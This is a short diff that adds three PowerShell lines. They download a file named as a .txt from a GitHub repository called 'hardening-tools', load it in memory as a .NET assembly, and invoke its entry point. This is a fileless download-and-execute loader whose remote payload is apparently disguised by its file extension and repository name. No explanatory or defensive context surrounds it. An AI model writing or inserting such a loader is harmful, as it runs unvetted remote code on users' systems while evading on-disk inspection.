@@ -1,0 +1,3 @@
+$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/usr1221/hardening-tools/raw/refs/heads/main/ConsoleAppCS.txt')
+$assem = [System.Reflection.Assembly]::Load($data)
+$assem.EntryPoint.Invoke($null, @(,[string[]]@()))
